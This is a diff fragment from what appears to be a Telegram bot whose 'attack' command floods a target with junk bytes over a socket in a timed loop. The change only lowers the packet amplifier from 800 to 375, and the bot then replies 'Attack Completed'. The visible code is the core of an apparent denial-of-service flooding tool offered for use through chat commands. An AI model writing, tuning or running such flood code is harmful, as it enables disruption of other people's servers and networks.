@@ -50,7 +50,7 @@ def attack(update, context):
             while time.time() < t_end:
                 s.send(b"\x99" * amplifier)
 
-        threading.Thread(target=send_packet(800), daemon=True).start()
+        threading.Thread(target=send_packet(375), daemon=True).start()
         update.message.reply_text("Attack Completed")
         print("Attack Completed")
         print("Bot is Ready to go:")
